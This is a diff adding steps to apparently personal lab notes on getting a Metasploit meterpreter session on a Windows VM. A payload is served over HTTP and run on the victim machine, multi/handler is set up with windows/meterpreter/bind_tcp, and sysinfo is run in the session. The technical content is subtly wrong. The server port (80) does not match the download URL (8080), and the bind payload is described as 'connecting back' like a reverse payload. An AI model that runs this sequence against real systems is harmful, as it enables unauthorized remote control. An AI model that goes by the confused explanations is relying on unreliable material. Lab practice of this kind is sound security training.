@@ -5,3 +5,27 @@
 3. python3 -m http.server 80 -> It starts a simple HTTP server on port 80 to serve the payloads created above.
 
 4. open windows vm -> chrome -> http://<kali-ip>:8080/pay.exe -> It downloads the pay.exe payload from the Kali machine to the Windows VM.
+
+5. msfconsole
+
+6. use exploit/multi/handler -> It uses the multi/handler exploit module in Metasploit to handle incoming connections from the payload.
+
+7. set payload windows/meterpreter/bind_tcp -> It sets the payload to windows/meterpreter/bind_tcp to match the payload created earlier.
+
+8. show options -> It shows the options available for the exploit module, including LHOST and LPORT.
+
+9. set RHOST <victim-ip> -> It sets the RHOST option to the IP address of the target Windows machine.
+
+10. set LPORT 4444 -> It sets the LPORT option to 4444, which is the port that the payload will connect back to.
+
+11. exploit -> It runs the exploit, which will wait for the target machine to connect back to the Metasploit handler.
+
+12. In the windows vm run the exe.
+
+13. You will get a meterpreter session on the windows vm.
+
+14. sysinfo -> It shows the system information of the target machine, including OS version, architecture, and hostname.
+
+15 . help -> It shows the available commands in the meterpreter session, which can be used to interact with the target machine.
+
+## this windoows/meterpreter/bind_tcp payload is used when the victim is known...
